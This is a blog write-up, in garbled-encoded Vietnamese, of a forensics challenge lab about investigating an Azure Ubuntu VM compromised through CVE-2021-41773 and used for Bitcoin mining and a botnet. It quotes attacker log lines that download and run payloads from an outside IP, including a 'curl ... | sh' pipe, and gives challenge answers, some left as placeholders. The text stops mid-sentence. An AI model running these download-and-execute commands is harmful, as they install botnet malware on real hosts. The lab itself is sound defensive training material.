---
layout: post
title: "Azure Lab - Digital Forensics Challenge"
date: 2025-10-02
categories: [Digital Forensics, CTF]
tags: [Azure, FTK Imager, volatility, Linux Forensics, Memory Analysis]
difficulty: Hard
image:
    path: /assets/img/posts/Azure_lab/banner.png
    alt: Azure
---

# Azure Lab

**Difficulty:** Hard  
**Category:** Endpoint  
**Tools:** FTK Imager, Volatility

---

## üìã Overview

### üìÄ `sdb.vhd.gz` ‚Äì ·∫¢nh ƒëƒ©a ·∫£o (Virtual Hard Disk)

- **Ngu·ªìn g·ªëc**: Snapshot t·ª´ Azure ‚Äì t·ª©c l√† m·ªôt b·∫£n sao c·ªßa ·ªï ƒëƒ©a ch√≠nh t·ª´ m√°y ·∫£o tr√™n n·ªÅn t·∫£ng ƒë√°m m√¢y Azure
- **ƒê·ªãnh d·∫°ng**: `.vhd.gz` l√† ·∫£nh ·ªï ƒëƒ©a VHD (Virtual Hard Disk) ƒë∆∞·ª£c n√©n l·∫°i b·∫±ng gzip
- **M·ª•c ƒë√≠ch s·ª≠ d·ª•ng trong forensics**:
  - Ki·ªÉm tra **file system** (h·ªá th·ªëng t·ªáp): c√≥ th·ªÉ mount ·∫£nh n√†y v√† duy·ªát to√†n b·ªô d·ªØ li·ªáu nh∆∞ m·ªôt ·ªï ƒëƒ©a th·∫≠t
  - T√¨m ki·∫øm **t√°c v·ª• theo l·ªãch** (cron jobs), **script ƒë·ªôc h·∫°i**, **c√°c file m·ªõi t·∫°o ho·∫∑c b·ªã ch·ªânh s·ª≠a**
  - Ph√°t hi·ªán **t√†i kho·∫£n ng∆∞·ªùi d√πng l·∫°**, **backdoor**, ho·∫∑c **ph·∫ßn m·ªÅm ƒë·ªôc h·∫°i b·ªã c√†i ƒë·∫∑t**

‚úÖ **D·ªØ li·ªáu kh√¥ng thay ƒë·ªïi ‚Äì r·∫•t t·ªët cho ƒëi·ªÅu tra d·∫•u v·∫øt l√¢u d√†i**

---

### üß† `ubuntu.20211208.mem.gz` ‚Äì B·∫£n ghi b·ªô nh·ªõ (Memory Dump)

- **Ngu·ªìn g·ªëc**: T·∫°o b·ªüi c√¥ng c·ª• LiME ‚Äì m·ªôt c√¥ng c·ª• n·ªïi ti·∫øng ƒë·ªÉ tr√≠ch xu·∫•t b·ªô nh·ªõ RAM c·ªßa h·ªá th·ªëng Linux
- **ƒê·ªãnh d·∫°ng**: T·∫≠p tin dump b·ªô nh·ªõ n√©n b·∫±ng gzip
- **M·ª•c ƒë√≠ch s·ª≠ d·ª•ng trong forensics**:
  - Kh√°m ph√° **ti·∫øn tr√¨nh ƒëang ch·∫°y (processes)** t·∫°i th·ªùi ƒëi·ªÉm l·∫•y dump
  - Xem **k·∫øt n·ªëi m·∫°ng**, **socket**, ho·∫∑c **shell ƒëang ho·∫°t ƒë·ªông**
  - Ph·ª•c h·ªìi **l·ªánh bash** g·∫ßn nh·∫•t ho·∫∑c **payload** n·∫±m trong b·ªô nh·ªõ nh∆∞ng ch∆∞a ghi v√†o ·ªï ƒëƒ©a
  - Ph√°t hi·ªán **rootkit**, **keylogger**, ho·∫∑c **malware in-memory**

‚úÖ **D·ªØ li·ªáu d·ªÖ m·∫•t ‚Äì nh∆∞ng l·∫°i ch·ª©a th√¥ng tin r·∫•t "t∆∞∆°i" v·ªÅ ho·∫°t ƒë·ªông c·ªßa k·∫ª t·∫•n c√¥ng**

---

### üß∞ `uac.tgz` ‚Äì K·∫øt qu·∫£ t·ª´ Unix Artifact Collector (UAC)

- **Ngu·ªìn g·ªëc**: UAC l√† m·ªôt c√¥ng c·ª• t·ª± ƒë·ªông thu th·∫≠p d·ªØ li·ªáu ƒëi·ªÅu tra s·ªë tr√™n h·ªá th·ªëng Unix/Linux
- **ƒê·ªãnh d·∫°ng**: `.tgz` ‚Äì file tar n√©n ch·ª©a nhi·ªÅu file vƒÉn b·∫£n, log, output c·ªßa l·ªánh h·ªá th·ªëng
- **Th√¥ng tin ƒë∆∞·ª£c thu th·∫≠p**:
  - Danh s√°ch ti·∫øn tr√¨nh ƒëang ch·∫°y (`ps`, `top`, `pstree`)
  - K·∫øt n·ªëi m·∫°ng (`ss`, `netstat`)
  - File ƒë∆∞·ª£c m·ªü (`lsof`)
  - Th√¥ng tin ng∆∞·ªùi d√πng (`last`, `who`, `w`)
  - L·ªãch s·ª≠ l·ªánh (`.bash_history`, `.zsh_history`, ...)

‚úÖ **T·ªïng quan nhanh v·ªÅ tr·∫°ng th√°i h·ªá th·ªëng t·∫°i th·ªùi ƒëi·ªÉm c·ª• th·ªÉ**

---

### üìä T·ªïng quan Artifacts

| Artifact | D·ªØ li·ªáu | M·ª•c ti√™u ch√≠nh |
|----------|---------|----------------|
| `sdb.vhd.gz` | ·ªî ƒëƒ©a | Ph√°t hi·ªán persistence & artifacts l√¢u d√†i |
| `ubuntu.20211208.mem.gz` | RAM | Ph√¢n t√≠ch h√†nh vi t·∫°m th·ªùi, malware ho·∫°t ƒë·ªông |
| `uac.tgz` | B√°o c√°o | Snapshot t·ªïng h·ª£p v·ªÅ h·ªá th·ªëng & ng∆∞·ªùi d√πng |

---

## üîç Questions & Solutions

### Q1: Cleanup Script Name
**File:** `sdb.vhd`  
**Question:** There is a script that runs every minute to do cleanup. What is the name of the file?

M·ªü FTK Imager, ki·ªÉm tra c√°c file crontabs t·∫°i:
- `/etc/cron*`
- `/var/spool/crontabs`

![Crontab file](../assets/img/posts/Azure_lab/image.png)

![Crontab root](../assets/img/posts/Azure_lab/image%201.png)

![Remove script](../assets/img/posts/Azure_lab/image%202.png)

File th·ª±c hi·ªán v·ªõi quy·ªÅn root, v·ªõi c√∫ ph√°p `* * * * *` (5 d·∫•u *) t·ª©c th·ª±c thi m·ªói ph√∫t.

**Answer:** `/root/remove.sh`

---

### Q2: First Malware File
**File:** `sdb.vhd`  
**Question:** The script in Q#1 terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file?

![Remove script content](../assets/img/posts/Azure_lab/image%203.png)

Script th·ª±c hi·ªán:
- V√≤ng l·∫∑p `for` t√¨m ki·∫øm c√°c ti·∫øn tr√¨nh `kinsing|kdevtmp` trong `/tmp`
- L·∫•y PID v√† terminate ch√∫ng

**Answer:** `kinsing`

---

### Q3: New File Permissions
**File:** `sdb.vhd`  
**Question:** The script in Q#1 changes the permissions for some files. What is their new permission?

**Answer:** `444` (read-only for all users ‚Üí ki·ªÉm so√°t vi·ªác th·ª±c thi)

---

### Q4: Botnet Agent SHA256
**File:** `sdb.vhd`  
**Question:** What is the sha256 of the botnet agent file?

**Background:** CVE-2021-41773 - Apache Path Traversal v√† RCE vulnerability

Ki·ªÉm tra `/var/log/apache2/access_log`:

![Access log](../assets/img/posts/Azure_lab/image%205.png)

C√°c IP ƒëang c·ªë g·∫Øng khai th√°c l·ªó h·ªïng.

![POST requests](../assets/img/posts/Azure_lab/image%206.png)

T√¨m ki·∫øm v·ªõi regex: request POST v√† status 200.

#### Ph√¢n t√≠ch Log Files

| Log file | Ghi g√¨? | Khi n√†o d√πng |
|----------|---------|--------------|
| `access_log` | M·ªçi request HTTP ƒë·∫øn server (GET, POST, ...) | ‚úÖ X√°c ƒë·ªãnh th·ªùi gian, IP, URL t·∫•n c√¥ng |
| `error_log` | L·ªói x·∫£y ra khi x·ª≠ l√Ω request / CGI / shell | ‚úÖ Xem payload, shell command, l·ªói khi th·ª±c thi m√£ ƒë·ªôc |

Ki·ªÉm tra `error_log` v·ªõi c√°c keyword: `curl`, `wget`, `chmod +x`

![Error log search](../assets/img/posts/Azure_lab/image%208.png)

```bash
grep "chmod +x" error_log
```

Output:
```bash
[Thu Nov 11 19:08:22.859342 2021] [dumpio:trace7] [pid 803:tid 139978898114304] 
[client 141.135.85.36:51858] mod_dumpio:  dumpio_in (data-HEAP): 
echo; /usr/bin/wget -O /tmp/dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; 
chmod +x /tmp/dk86; /tmp/dk86 &;
```

#### T·∫°i sao file l·∫°i ·ªü `/var/tmp` thay v√¨ `/tmp`?

| Th∆∞ m·ª•c | ƒê·∫∑c ƒëi·ªÉm |
|---------|----------|
| `/tmp` | T·∫°m th·ªùi, **b·ªã x√≥a khi reboot** |
| `/var/tmp` | T·∫°m th·ªùi, **gi·ªØ l·∫°i sau reboot** |

![dk86 file](../assets/img/posts/Azure_lab/image%209.png)

Export file `dk86` v√† x√°c minh tr√™n VirusTotal.

**Answer:** *(SHA256 hash of dk86 file)*

---

### Q5: Botnet Name
**File:** `sdb.vhd`  
**Question:** What is the name of the botnet in Q#4?

![VirusTotal result](../assets/img/posts/Azure_lab/image%2010.png)

![Botnet name](../assets/img/posts/Azure_lab/image%2011.png)

**Answer:** *(Botnet name from VirusTotal)*

---

### Q6: IP Address Timeline
**File:** `sdb.vhd`  
**Question:** What IP address matches the creation timestamp of the botnet agent file in Q#4?

![Timeline analysis](../assets/img/posts/Azure_lab/image%2012.png)

Th·ªùi gian t·∫£i xu·ªëng `dk86` v√† IP li√™n quan.

**Answer:** `141.135.85.36`

---

### Q7: Download URL
**File:** `sdb.vhd`  
**Question:** What URL did the attacker use to download the botnet agent?

**Answer:** `http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86`

---

### Q8: Self-Deleting Script
**File:** `sdb.vhd`  
**Question:** What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself?

T√¨m ki·∫øm v·ªõi `rm` command nh∆∞ng kh√¥ng c√≥ k·∫øt qu·∫£ r√µ r√†ng.

![Search attempts](../assets/img/posts/Azure_lab/image%2013.png)

Thay ƒë·ªïi chi·∫øn l∆∞·ª£c: t√¨m ki·∫øm theo ƒë·ªãa ch·ªâ IP.

![IP search](../assets/img/posts/Azure_lab/image%2015.png)

![Suspicious string](../assets/img/posts/Azure_lab/image%2016.png)

Ph√°t hi·ªán command:
```bash
curl -s http://138.197.206.223/.../b64.php | sh
```

![curl command](../assets/img/posts/Azure_lab/image%2017.png)

T√¨m file `b64.php` trong FTK Imager:

![b64.php file](../assets/img/posts/Azure_lab/image%2019.png)

![Decoded content](../assets/img/posts/Azure_lab/image%2020.png)

Gi·∫£i m√£ base64 hai l·∫ßn.

![Final decode](../assets/img/posts/Azure_lab/image%2021.png)

**Answer:** `.install`

---

### Q9: Downloaded Shell Scripts
**File:** `sdb.vhd`  
**Question:** The attacker downloaded sh scripts. What are the names of these files?

![Shell scripts](../assets/img/posts/Azure_lab/image%2022.png)

Scripts ƒë∆∞·ª£c t·∫£i v·ªÅ:
1. `ap.sh` (piped to bash)
2. `0_cron.sh` (wget, chmod 777, execute)
3. `0_linux.sh` (wget, chmod 777, execute)

**Answer:** `ap.sh, 0_cron.sh, 0_linux.sh`

---

### Q10: Deleted Directory Processes
**File:** `UAC`  
**Question:** Two suspicious processes were running from a deleted directory. What are their PIDs?

**Background:** UAC (Unix Artifact Collector) thu th·∫≠p d·ªØ li·ªáu forensics t·ª´ h·ªá th·ªëng Unix/Linux.

> **Note:** Trong Unix/Linux, khi file b·ªã x√≥a nh∆∞ng process v·∫´n ch·∫°y, file v·∫´n t·ªìn t·∫°i trong memory cho ƒë·∫øn khi process k·∫øt th√∫c. ƒê√¢y th∆∞·ªùng l√† d·∫•u hi·ªáu c·ªßa malicious activity.

T√¨m trong `live_response/process/lsof`:

![lsof output](../assets/img/posts/Azure_lab/image%2023.png)

Hai ti·∫øn tr√¨nh kh·∫£ nghi:
1. **PID 6388**: ch·∫°y `sleep` trong `/var/tmp` (th∆∞ m·ª•c cho ph√©p ghi v√† t·ªìn t·∫°i sau reboot)
2. **PID 20645**: ch·∫°y `.src.sh`

**Answer:** `6388, 20645`

---

### Q11: Suspicious Command Line
**File:** `UAC`  
**Question:** What is the suspicious command line associated with the 2nd PID in Q#10?

![Command line](../assets/img/posts/Azure_lab/image%2024.png)

Command s·ª≠ d·ª•ng `.` ·ªü ƒë·∫ßu t√™n file ƒë·ªÉ ·∫©n trong Linux.

**Answer:** *(Command line from the image)*

---

### Q12: Remote Connection Details
**File:** `UAC`  
**Question:** UAC gathered some data from the second process in Q#10. What is the remote IP address and remote port that was used in the attack?

Ki·ªÉm tra `proc/20645/environ.txt` (bi·∫øn m√¥i tr∆∞·ªùng c·ªßa ti·∫øn tr√¨nh):

![Environment variables](../assets/img/posts/Azure_lab/image%2025.png)

**Answer:** *(IP:Port from environ.txt)*

---

### Q13: Executing User
**File:** `UAC`  
**Question:** Which user was responsible for executing the command in Q#11?

![User information](../assets/img/posts/Azure_lab/image%2026.png)

**Answer:** `daemon`

> **Note:** User `daemon` l√† t√†i kho·∫£n h·ªá th·ªëng v·ªõi ƒë·∫∑c quy·ªÅn th·∫•p, th∆∞·ªùng ƒë∆∞·ª£c d√πng ƒë·ªÉ ch·∫°y background services. Attacker s·ª≠ d·ª•ng user n√†y ƒë·ªÉ tr√°nh ph√°t hi·ªán.

---

### Q14: Shell Processes from /tmp
**File:** `UAC`  
**Question:** Two suspicious shell processes were running from the tmp folder. What are their PIDs?

![Shell processes](../assets/img/posts/Azure_lab/image%2027.png)

Hai ti·∫øn tr√¨nh shell ch·∫°y t·ª´ `/tmp`:
- PID 15853
- PID 21875

**T·∫°i sao `/tmp` v√† `/var/tmp` nguy hi·ªÉm?**
- T·∫•t c·∫£ user c√≥ quy·ªÅn ghi (`777`)
- D·ªÖ b·ªã b·ªè qua khi gi√°m s√°t
- `/tmp` b·ªã x√≥a sau reboot (x√≥a d·∫•u v·∫øt)
- `/var/tmp` gi·ªØ l·∫°i sau reboot (malware persistence)

**Answer:** `15853, 21875`

---

### Q15: Volatility Profile Setup
**File:** `ubuntu.20211208.mem`

![Profile setup](../assets/img/posts/Azure_lab/image%2028.png)

![Profile verification](../assets/img/posts/Azure_lab/image%2029.png)

---

### Q16: Bash History Script
**File:** `ubuntu.20211208.mem`  
**Question:** From Bash history. The attacker downloaded an sh script. What is the name of the file?

![Bash history](../assets/img/posts/Azure_lab/image%2030.png)

**Answer:** *(Script name from bash history)*

---

## üìù Summary

Lab n√†y minh h·ªça m·ªôt cu·ªôc t·∫•n c√¥ng ph·ª©c t·∫°p v√†o Azure VM th√¥ng qua:
- Khai th√°c CVE-2021-41773 (Apache Path Traversal & RCE)
- T·∫£i xu·ªëng v√† th·ª±c thi botnet agent
- S·ª≠ d·ª•ng Bitcoin miner malware
- Thi·∫øt l·∫≠p persistence mechanisms
- ·∫®n processes v√† files

**Key Takeaways:**
- Ph√¢n t√≠ch multi-source artifacts (disk, memory, UAC)
- Correlation gi·ªØa logs, processes, v√† file system
- Hi·ªÉu